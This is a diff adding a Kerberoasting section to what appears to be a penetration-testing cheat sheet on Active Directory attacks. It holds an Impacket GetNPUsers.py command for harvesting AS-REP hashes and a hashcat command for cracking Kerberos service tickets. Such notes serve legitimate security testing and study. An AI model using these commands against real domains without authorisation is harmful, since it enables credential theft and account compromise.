@@ -38,6 +38,18 @@ Impacket's `GetNPUsers.py` will attempt to harvest the non-preauth AS_REP respon
 `python3 GetNPUsers.py test.local/ -dc-ip <ip> -usersfile usernames.txt -format hashcat -outputfile hashes`
 
 
+## Kerberoasting
+Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name.
+
+### Cracking the ticket
+```bash
+hashcat -m 13100 --force <hash_file> <password_file>
+```
+
+#### References
+- [https://www.crowdstrike.com/cybersecurity-101/kerberoasting/](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)
+
+
 # Tools for all tech
 ## crackmapexec
 This allows you to enumerate Active Directory environments.
